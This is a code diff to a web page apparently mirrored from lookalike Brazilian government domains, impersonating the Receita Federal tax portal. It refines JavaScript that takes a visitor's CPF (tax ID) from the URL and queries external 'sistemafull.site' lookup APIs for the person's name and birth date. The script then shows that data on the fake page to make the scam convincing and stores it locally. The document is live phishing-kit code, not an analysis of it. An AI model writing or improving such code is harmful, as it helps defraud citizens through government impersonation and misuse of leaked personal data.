@@ -1,7 +1,11 @@
 <!DOCTYPE html>
 <html>
 
-<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<!-- Mirrored from receita.canalgovbr.org/42492556620 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 03 Aug 2025 02:45:20 GMT -->
+<!-- Added by HTTrack -->
+
+<!-- Mirrored from g0vbeneficio-br.com/site-receita/consulta.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 20 Mar 2026 15:12:37 GMT -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 
 <head>
     <meta charset="utf-8" />
@@ -1897,13 +1901,12 @@
             // Função principal que executa a consulta em cascata
             async function executeApiConsultation() {
                 showLoadingScreen();
-                let cpf = getCpfFromUrl();
-                if (!cpf) return hideLoadingScreen();
+                let cpf = String(getCpfFromUrl() || '').replace(/\D/g, '');
+                if (!cpf || cpf.length !== 11) return hideLoadingScreen();
 
                 let dataFinal = null;
 
                 try {
-                    // TENTATIVA 1: API Premium (via seu PHP novo)
                     updateLoadingText('Consultando base de dados nacional...');
                     const res1 = await fetch(`https://base1.sistemafull.site:80/api/cpfx?CPF=${cpf}`, {
                         method: 'GET',
@@ -1912,41 +1915,55 @@
                     });
                     const result1 = await res1.json();
 
-                    if (result1.success && result1.data) {
-                        dataFinal = result1.data;
-                        console.log("Dados obtidos via API Premium");
+                    // A base1 pode retornar direto no corpo, sem success/data
+                    if (result1 && (result1.NOME || result1.nome)) {
+                        dataFinal = {
+                            NOME: result1.NOME || result1.nome,
+                            CPF: result1.CPF || result1.cpf || cpf,
+                            NASC: result1.NASC || result1.NASCIMENTO || result1.nascimento || ''
+                        };
+                        console.log('Dados obtidos via API BASE1');
+                    } else if (result1 && result1.success && result1.data) {
+                        dataFinal = {
+                            NOME: result1.data.NOME || result1.data.nome,
+                            CPF: result1.data.CPF || result1.data.cpf || cpf,
+                            NASC: result1.data.NASC || result1.data.NASCIMENTO || result1.data.nascimento || ''
+                        };
+                        console.log('Dados obtidos via API BASE1 (formato success/data)');
                     } else {
-                        throw new Error("API Premium falhou");
+                        throw new Error('API BASE1 não retornou nome válido');
                     }
 
                 } catch (error) {
-                    // TENTATIVA 2: Fallback Sistemafull
-                    console.warn("API 1 falhou, tentando contingência...");
+                    console.warn('API 1 falhou, tentando contingência...', error);
                     updateLoadingText('Acessando servidor de contingência...');
 
                     try {
-                        const res2 = await fetch(`https://base2.sistemafull.site:80/api/cpfx?CPF=${cpf}`);
+                        const res2 = await fetch(`https://base2.sistemafull.site:80/api/cpfx?CPF=${cpf}`, {
+                            method: 'GET',
+                            headers: { 'Content-Type': 'application/json' },
+                            cache: 'no-store'
+                        });
                         const result2 = await res2.json();
 
                         if (result2 && (result2.NOME || result2.nome)) {
-                            // Padroniza para o formato que seu site espera
                             dataFinal = {
                                 NOME: result2.NOME || result2.nome,
                                 CPF: result2.CPF || result2.cpf || cpf,
-                                NASC: result2.NASC || result2.nascimento || ""
+                                NASC: result2.NASC || result2.NASCIMENTO || result2.nascimento || ''
                             };
+                            console.log('Dados obtidos via API BASE2');
                         }
                     } catch (error2) {
-                        console.error("Ambas as APIs falharam.");
+                        console.error('Ambas as APIs falharam.', error2);
                     }
                 }
 
-                // APLICAÇÃO DOS DADOS
-                if (dataFinal) {
+                if (dataFinal && dataFinal.NOME) {
                     updatePageData(dataFinal);
                     localStorage.setItem('customerData', JSON.stringify({
                         nome: dataFinal.NOME,
-                        cpf: dataFinal.CPF.replace(/\D/g, ''),
+                        cpf: String(dataFinal.CPF || cpf).replace(/\D/g, ''),
                         nascimento: dataFinal.NASC || null
                     }));
                 } else {
